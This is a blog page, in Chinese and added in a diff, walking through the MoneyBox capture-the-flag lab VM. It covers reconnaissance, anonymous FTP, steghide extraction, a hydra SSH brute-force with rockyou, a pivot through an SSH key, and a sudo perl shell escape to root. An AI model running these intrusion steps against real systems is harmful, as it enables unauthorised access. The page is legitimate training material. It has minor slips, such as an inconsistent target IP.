@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>MoneyBox靶场打靶 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="启动MoneyBox靶场，打开kali虚拟机，进入命令行模式。  找到MoneyBox靶场的ip1arp-scan -l   可以进入192.168.56.101  进行目录扫描1dirsearch -u &quot;http:&#x2F;&#x2F;192.168.56.101&quot; -x 403,404   可以看到分别有&#x2F;blogs和&#x2F;index.html两个子目录。 查看页面http">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MoneyBox靶场打靶">
+<meta property="og:url" content="http://example.com/2024/01/04/MoneyBox%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="启动MoneyBox靶场，打开kali虚拟机，进入命令行模式。  找到MoneyBox靶场的ip1arp-scan -l   可以进入192.168.56.101  进行目录扫描1dirsearch -u &quot;http:&#x2F;&#x2F;192.168.56.101&quot; -x 403,404   可以看到分别有&#x2F;blogs和&#x2F;index.html两个子目录。 查看页面http">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104202521214.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104202948963.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104203012710.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104205750987.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104205938687.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104210010183.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104210322276.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104210351849.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104203221164.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104203501493.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104204000620.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104204604076.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104204747120.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104205103802.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104205346292.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104210956106.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104211206978.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105093936097.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105094537305.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105101421017.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105101826801.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105102050373.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105110447242.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105110808941.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105110936604.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105141615570.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105141721517.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105142327105.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105142431528.png">
+<meta property="article:published_time" content="2024-01-04T12:24:09.000Z">
+<meta property="article:modified_time" content="2024-01-05T06:29:56.240Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104202521214.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">John Doe</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>43</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-MoneyBox靶场打靶" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/01/04/MoneyBox%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/" class="article-date">
+  <time class="post-time" datetime="2024-01-04T12:24:09.000Z" itemprop="datePublished">
+    <span class="post-month">1月</span><br/>
+    <span class="post-day">04</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      MoneyBox靶场打靶
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>启动MoneyBox靶场，打开kali虚拟机，进入命令行模式。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104202521214.png" alt="image-20240104202521214"></p>
+<h4 id="找到MoneyBox靶场的ip"><a href="#找到MoneyBox靶场的ip" class="headerlink" title="找到MoneyBox靶场的ip"></a>找到MoneyBox靶场的ip</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104202948963.png" alt="image-20240104202948963"></p>
+<p>可以进入192.168.56.101</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104203012710.png" alt="image-20240104203012710"></p>
+<h4 id="进行目录扫描"><a href="#进行目录扫描" class="headerlink" title="进行目录扫描"></a>进行目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.56.101&quot; -x 403,404</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104205750987.png" alt="image-20240104205750987"></p>
+<p>可以看到分别有&#x2F;blogs和&#x2F;index.html两个子目录。</p>
+<h4 id="查看页面http-192-168-56-101-blogs"><a href="#查看页面http-192-168-56-101-blogs" class="headerlink" title="查看页面http://192.168.56.101/blogs/"></a>查看页面<a target="_blank" rel="noopener" href="http://192.168.56.101/blogs/">http://192.168.56.101/blogs/</a></h4><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104205938687.png" alt="image-20240104205938687"></p>
+<p>右键查看页面源代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104210010183.png" alt="image-20240104210010183"></p>
+<p>发现源代码下面说’<!--the hint is the another secret directory is S3cr3t-T3xt-->‘指有一个隐藏目录为S3cr3t-T3xt</p>
+<h4 id="查看页面http-192-168-56-101-S3cr3t-T3xt"><a href="#查看页面http-192-168-56-101-S3cr3t-T3xt" class="headerlink" title="查看页面http://192.168.56.101/S3cr3t-T3xt/"></a>查看页面<a target="_blank" rel="noopener" href="http://192.168.56.101/S3cr3t-T3xt/">http://192.168.56.101/S3cr3t-T3xt/</a></h4><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104210322276.png" alt="image-20240104210322276"></p>
+<p>右键查看源代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104210351849.png" alt="image-20240104210351849"></p>
+<p>下面写了一个秘钥为3xtr4ctd4t4 。暂时用不到，先记下来。</p>
+<h4 id="扫描ip：192-168-56-101有哪些开放端口"><a href="#扫描ip：192-168-56-101有哪些开放端口" class="headerlink" title="扫描ip：192.168.56.101有哪些开放端口"></a>扫描ip：192.168.56.101有哪些开放端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104203221164.png" alt="image-20240104203221164"></p>
+<h4 id="对指定IP地址21-22-80进行扫描"><a href="#对指定IP地址21-22-80进行扫描" class="headerlink" title="对指定IP地址21,22,80进行扫描"></a>对指定IP地址21,22,80进行扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 21,22,80 -sC 192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104203501493.png" alt="image-20240104203501493"></p>
+<p>根据ftp-anon: Anonymous FTP login allowed (FTP code 230)（ftp-anon: 允许匿名FTP登录 (FTP代码230)）可以得出ftp拥有允许匿名ftp登入漏洞。</p>
+<p>ftp可用于传输文件</p>
+<h4 id="利用ftp漏洞下载文件"><a href="#利用ftp漏洞下载文件" class="headerlink" title="利用ftp漏洞下载文件"></a>利用ftp漏洞下载文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101</span><br><span class="line"></span><br><span class="line">Name为：Anonymous</span><br><span class="line">password为空</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104204000620.png" alt="image-20240104204000620"></p>
+<h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">help  #可以先用help查看有哪些命令</span><br><span class="line">ls    #查看是否有文件，及文件名</span><br><span class="line">get trytofind.jpg #下载</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104204604076.png" alt="image-20240104204604076"></p>
+<p>输入quit退出</p>
+<h4 id="查看照片"><a href="#查看照片" class="headerlink" title="查看照片"></a>查看照片</h4><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104204747120.png" alt="image-20240104204747120"></p>
+<h4 id="利用strings-trytofind-jpg查看文件二进制"><a href="#利用strings-trytofind-jpg查看文件二进制" class="headerlink" title="利用strings trytofind.jpg查看文件二进制"></a>利用strings trytofind.jpg查看文件二进制</h4><p>可以看到图片多了一些多余的，可能藏东西了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104205103802.png" alt="image-20240104205103802"></p>
+<h4 id="尝试将文件导出"><a href="#尝试将文件导出" class="headerlink" title="尝试将文件导出"></a>尝试将文件导出</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p>可以看出确实有隐藏文件，但需要秘钥。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104205346292.png" alt="image-20240104205346292"></p>
+<p>尝试将192.168.56.101&#x2F;S3cr3t-T3xt&#x2F;页面找到的key:3xtr4ctd4t4带入.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide  extract -sf trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104210956106.png" alt="image-20240104210956106"></p>
+<p>可以看到导出了一个名为data.txt的文件。</p>
+<h4 id="利用cat查看文件"><a href="#利用cat查看文件" class="headerlink" title="利用cat查看文件"></a>利用cat查看文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./data.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240104211206978.png" alt="image-20240104211206978"></p>
+<p>我告诉你一件很重要的事。你的密码太短了，所以改一下吧！不要低估它……</p>
+<p>说明有一个用户名名为renu，且renu密码可能是弱密码</p>
+<h4 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h4><p>renu密码是弱密码，说明可以用爆破报出。</p>
+<ul>
+<li><ul>
+<li>cp &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz .   &#x2F;&#x2F;rockyou.txt.gz是kali已有的密码字典，一般存在于&#x2F;usr&#x2F;share&#x2F;wordlists里</li>
+<li>gunzip rockyou.txt.gz     &#x2F;&#x2F;这是个超大的密码字典</li>
+<li>echo renu &gt; user.txt       &#x2F;&#x2F;将字符串 “renu” 写入一个名为 <code>user.txt</code> 的文件中。如果该文件已存在，则会被新的内容覆盖；否则，将创建一个新文件，并将内容写入其中。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P rockyou.txt 192.168.0.129 ssh </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105093936097.png" alt="image-20240105093936097"></p>
+<p>说明用户为renu，密码987654321</p>
+<h4 id="登入"><a href="#登入" class="headerlink" title="登入"></a>登入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh renu@192.168.56.101</span><br><span class="line">usernamewei：987654321</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105094537305.png" alt="image-20240105094537305"></p>
+<p>出现renu@MoneyBox说明成功登入</p>
+<h4 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h4><p>利用ls和ls -al查看是否有文件或隐藏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">ls -al</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105101421017.png" alt="image-20240105101421017"></p>
+<p>可以看到有一个名为user1.txt的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105101826801.png" alt="image-20240105101826801"></p>
+<p>找到一个flag</p>
+<h4 id="查看历史命令"><a href="#查看历史命令" class="headerlink" title="查看历史命令"></a>查看历史命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .bash_history</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105102050373.png" alt="image-20240105102050373"></p>
+<p>可以看到历史命令通过ssh-copy-id <a href="mailto:&#108;&#x69;&#x6c;&#x79;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x34;&#51;&#x2e;&#x38;&#48;">&#108;&#x69;&#x6c;&#x79;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x34;&#51;&#x2e;&#x38;&#48;</a>命令登入了192.168.43.80</p>
+<p>说明renu可以直接免密登入lily账户</p>
+<h4 id="登入192-168-56-101的lily的账户"><a href="#登入192-168-56-101的lily的账户" class="headerlink" title="登入192.168.56.101的lily的账户"></a>登入192.168.56.101的lily的账户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh lily@192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105110447242.png" alt="image-20240105110447242"></p>
+<h4 id="查看lily账户的文件"><a href="#查看lily账户的文件" class="headerlink" title="查看lily账户的文件"></a>查看lily账户的文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">ls -al</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105110808941.png" alt="image-20240105110808941"></p>
+<p>可以看到有一个user2.txt文件</p>
+<h4 id="查看user2-txt文件"><a href="#查看user2-txt文件" class="headerlink" title="查看user2.txt文件"></a>查看user2.txt文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./user2.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105110936604.png" alt="image-20240105110936604"></p>
+<p>找到第二个flag</p>
+<h4 id="查看是否可以用sudo来运行perl"><a href="#查看是否可以用sudo来运行perl" class="headerlink" title="查看是否可以用sudo来运行perl"></a>查看是否可以用sudo来运行perl</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105141615570.png" alt="image-20240105141615570"></p>
+<p>发现可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105141721517.png" alt="image-20240105141721517"></p>
+<p>成功getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~ //进入根目录</span><br><span class="line">ls -al //查看文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105142327105.png" alt="image-20240105142327105"></p>
+<p>发现有一个.root.txt的隐藏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .root,txt   //查看文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240105142431528.png" alt="image-20240105142431528"></p>
+<p>查找到第三个flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/04/MoneyBox%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/" data-id="clr0db0yw00001ku4bgv74tfu" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/01/07/google%E6%90%9C%E7%B4%A2%E5%92%8Cfofa%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          google搜索和fofa搜索语法
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/01/04/%E9%9D%B6%E6%9C%BAMoneyBox%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">虚拟机VirtualBox和靶机MoneyBox的安装及使用</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Hexo</h1>
+    <h2 class="blog-subtitle"></h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">John Doe</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>43</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2023 - 2024 John Doe<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  
+<link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+
+  
+<script src="/plugin/galmenu/GalMenu.js"></script>
+
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/xxxxxxxxx" title="" class="menuItem">xxx</a>
+          
+            <a href="/xxxxxxx" title="" class="menuItem">xxxx</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
